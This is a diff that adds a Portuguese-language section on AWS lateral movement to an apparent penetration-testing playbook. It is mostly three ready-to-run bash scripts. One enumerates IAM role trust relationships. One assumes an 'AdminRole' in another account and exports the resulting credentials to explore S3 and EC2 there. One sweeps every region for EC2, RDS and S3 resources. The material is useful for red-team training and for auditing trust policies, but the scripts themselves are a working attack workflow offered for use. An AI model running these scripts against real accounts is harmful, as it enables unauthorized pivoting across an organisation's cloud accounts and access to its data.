@@ -473,6 +473,137 @@ aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" \
 
 ---
 
+
+## 2.5 LATERAL MOVEMENT
+
+## 5.1 AWS CROSS-ACCOUNT LATERAL MOVEMENT
+
+### 🎯 Vulnerabilidade
+```
+Tipo: Trust Relationship Abuse
+CVSS: 9.8
+Cenário: Conta A pode assumir role em Conta B
+Impacto: Accesso a múltiplas contas da organização
+```
+
+### 📋 EXPLORAÇÃO PASSO-A-PASSO
+
+#### FASE 1: DESCOBRIR TRUST RELATIONSHIPS
+
+```bash
+#!/bin/bash
+# Script: aws-trust-enum.sh
+
+CURRENT_ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
+
+echo "[*] Fase 1: Enumerar Trust Relationships"
+echo "[*] Conta Atual: $CURRENT_ACCOUNT"
+
+# Listar todas as roles na conta atual
+echo "[?] Listando roles da conta..."
+aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
+
+# Para cada role, verificar AssumeRolePolicyDocument
+aws iam list-roles --query 'Roles[*].RoleName' --output text | while read role; do
+  POLICY=$(aws iam get-role --role-name "$role" --query 'Role.AssumeRolePolicyDocument' --output json)
+  
+  # Procurar por contas externas
+  EXTERNAL_ACCOUNTS=$(echo "$POLICY" | grep -o '"AWS":"arn:aws:iam::[0-9]*' | grep -o '[0-9]*' | sort -u)
+  
+  if [ ! -z "$EXTERNAL_ACCOUNTS" ]; then
+    echo "[!] Role $role confia em:"
+    echo "$EXTERNAL_ACCOUNTS" | while read account; do
+      if [ "$account" != "$CURRENT_ACCOUNT" ]; then
+        echo "    [+] Conta: $account"
+      fi
+    done
+  fi
+done
+```
+
+#### FASE 2: ASSUMIR ROLE EM OUTRA CONTA
+
+```bash
+#!/bin/bash
+# Script: aws-cross-account-assume.sh
+
+TARGET_ACCOUNT="123456789012"
+TARGET_ROLE="AdminRole"
+
+echo "[*] Fase 2: Assumir Role em Outra Conta"
+echo "[*] Alvo: arn:aws:iam::$TARGET_ACCOUNT:role/$TARGET_ROLE"
+
+# Assumir role
+CREDS=$(aws sts assume-role \
+  --role-arn "arn:aws:iam::$TARGET_ACCOUNT:role/$TARGET_ROLE" \
+  --role-session-name "exploitation-session-$(date +%s)" \
+  --output json)
+
+if echo "$CREDS" | jq -e '.Credentials' > /dev/null; then
+  echo "[+] Role assumida com sucesso!"
+  
+  # Extrair credenciais
+  ACCESS_KEY=$(echo "$CREDS" | jq -r '.Credentials.AccessKeyId')
+  SECRET_KEY=$(echo "$CREDS" | jq -r '.Credentials.SecretAccessKey')
+  SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Credentials.SessionToken')
+  
+  # Ativar credenciais
+  export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
+  export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
+  export AWS_SESSION_TOKEN="$SESSION_TOKEN"
+  
+  echo "[+] Credenciais ativadas"
+  echo "[?] Verificando nova identidade..."
+  aws sts get-caller-identity
+  
+  # Agora você está na conta de alvo!
+  echo "[?] Explorando recursos da conta alvo..."
+  aws s3 ls
+  aws ec2 describe-instances --region us-east-1 | jq '.Reservations[0].Instances[0]'
+else
+  echo "[-] Falha ao assumir role"
+fi
+```
+
+## 5.2 AWS CROSS-REGION LATERAL MOVEMENT
+
+### 📋 EXPLORAÇÃO
+
+```bash
+#!/bin/bash
+# Script: aws-cross-region.sh
+
+echo "[*] Descobrir recursos em todas as regiões"
+
+# Listar todas as regiões
+REGIONS=$(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text)
+
+echo "[?] Procurando recursos sensíveis em $REGIONS"
+
+for region in $REGIONS; do
+  echo "[*] Região: $region"
+  
+  # Procurar S3 buckets (global, mas listar uma vez)
+  if [ "$region" = "us-east-1" ]; then
+    BUCKETS=$(aws s3 ls | awk '{print $3}')
+    echo "[+] S3 Buckets encontrados: $(echo $BUCKETS | wc -w)"
+  fi
+  
+  # EC2 instances
+  INSTANCES=$(aws ec2 describe-instances --region $region --query 'Reservations[*].Instances[*].InstanceId' --output text)
+  if [ ! -z "$INSTANCES" ]; then
+    echo "[+] EC2 em $region: $INSTANCES"
+  fi
+  
+  # RDS databases
+  DATABASES=$(aws rds describe-db-instances --region $region --query 'DBInstances[*].DBInstanceIdentifier' --output text 2>/dev/null)
+  if [ ! -z "$DATABASES" ]; then
+    echo "[+] RDS em $region: $DATABASES"
+  fi
+done
+```
+
+
 ## 🛠️ TOOLS NECESSÁRIAS
 
 ```bash
